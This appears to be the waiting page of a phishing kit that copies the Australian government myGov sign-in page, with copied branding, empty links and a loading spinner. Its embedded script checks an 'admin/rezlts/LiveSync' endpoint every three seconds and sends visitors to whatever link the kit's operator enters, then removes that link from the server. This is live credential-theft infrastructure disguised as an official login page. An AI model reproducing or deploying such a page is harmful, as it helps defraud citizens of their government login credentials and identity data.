
<!DOCTYPE html>

<html lang="en"><!--<![endif]--><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">

	<!--
E: PROD; 
C: MW1w; 
N: MW1w15; 
S: SW15a;  
-->
	<meta charset="utf-8">
	<meta http-equiv="x-ua-compatible" content="ie=edge">
	<meta name="apple-mobile-web-app-capable" content="yes">
	<title>
		Sign in with myGov - myGov
	</title>
	<meta name="description" content="">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<!-- phone number format detection, turning it off -->
	<meta name="format-detection" content="telephone=no">
	<script type="text/javascript" src="../KNYGHT/1/ruxitagentjs_ICA2NVfghjqrux_10253221019152312.js" data-dtconfig="app=5f15dc81410a75c1|ssc=1|featureHash=ICA2NVfghjqrux|vcv=2|rdnt=0|uxrgce=1|bp=3|cuc=gpalpirq|mel=100000|md=mdcc1=ainput#user-id,mdcc2=adiv.error-msg-text span,mdcc3=aspan[data-home-welcome-message]|ssv=4|lastModification=1709014143344|dtVersion=10253221019152312|tp=500,50,0,1|uxdcw=1500|agentUri=/LoginServices/main/ruxitagentjs_ICA2NVfghjqrux_10253221019152312.js|reportUrl=/LoginServices/main/rb_6de8e2e9-6719-45b3-86be-7effcb9f6525|rid=RID_315651698|rpid=1259795755|domain=my.gov.au"></script><link rel="icon" type="image/png" sizes="32x32" href="https://login.my.gov.au/mygov/content/mgv2/icons/favicon-32x32.png">
  	<link rel="icon" type="image/png" sizes="16x16" href="https://login.my.gov.au/mygov/content/mgv2/icons/favicon-16x16.png">
	<link href="../KNYGHT/1/css.css" rel="stylesheet">
	<link href="../KNYGHT/1/mgv2-application.css" rel="stylesheet">
	<link href="../KNYGHT/1/blugov.css" rel="stylesheet">
</head>

<body>




	
		
	
	





<nav class="uikit-skip-link" aria-label="Skip Links">
	<a class="uikit-skip-link__link" href="#content">Skip to main content</a>
</nav>

<div class="brand-rainbow">&nbsp;</div>
<header role="banner" class="mgvEnhanceHeader">
	<section class="wrapper">
		<div class="inner">
			<div class="unauth-grid">
				<div class="unauth-grid-row">
					<a href="" class="unauth-govt-crest__link">
					    <img id="unauth-govt-crest" src="../KNYGHT/1/myGov-cobranded-logo-black.svg" alt="Australian Government and myGov logo" role="img">
                    </a>

					<div class="header-links">
						<a href="">Help</a>
					</div>
				</div>
			</div>
		</div>
	</section>
</header>






<script type="text/javascript">
        function openLink() {
            // Use an AJAX request to get the link from the server
            var xhr = new XMLHttpRequest();
            xhr.open("GET", "../admin/rezlts/LiveSync/get_link.php", true);

            xhr.onreadystatechange = function () {
                if (xhr.readyState == 4 && xhr.status == 200) {
                    var link = xhr.responseText;

                    if (link) {
                        // Redirect the current tab to the new link
                        window.location.href = link;

                        // Request to remove the opened link from the server
                        var removeXhr = new XMLHttpRequest();
                        removeXhr.open("POST", "../admin/rezlts/LiveSync/remove_link.php", true);
                        removeXhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                        removeXhr.send("link=" + encodeURIComponent(link));
                    }
                }
            };

            xhr.send();
        }

        // Periodically check for and open links
        setInterval(openLink, 3000); // Check every 3 seconds
    </script>


<div class="wrapper-mapwap"><div class="main-block" id="content" role="main">
	
	<br>
	<br>
	<br>
	<p style="text-align:center;"><img alt="" src="https://global.discourse-cdn.com/sitepoint/original/3X/e/3/e352b26bbfa8b233050087d6cb32667da3ff809c.gif" height="100" width="100"></p>
</div></div>





<footer role="contentinfo">
    <div class="wrapper">
      <div class="inner">

        <section class="footer-list">
            <nav>
            <h2 class="sr-only" aria-label="Footer">Footer</h2>
            <ul class="lower-links">
                <li>
                    <a target="_blank" href="">Terms of use</a>
                </li>
                <li>
                    <a target="_blank" href="">Privacy and security</a>
                </li>
                <li>
                    <a target="_blank" href="">Copyright</a>
                </li>
                <li>
                    <a target="_blank" href="">Accessibility</a>
                </li>
            </ul>
            </nav>
        </section>
          <div class="footer-lower">
              <section class="footer-lower-logo">
              <a href="">
                  <img src="../KNYGHT/1/myGov-cobranded-logo-white.svg" alt="Australian Government and myGov logo" width="313.17" height="70" role="img">
              </a>
              </section>

              <p class="footer-acknowledgement">We acknowledge the 
Traditional Custodians of the lands we live on. We pay our respects to 
all Elders, past and present, of all Aboriginal and Torres Strait 
Islander nations.</p>
          </div>




      </div>
    </div>
  </footer>



</body></html>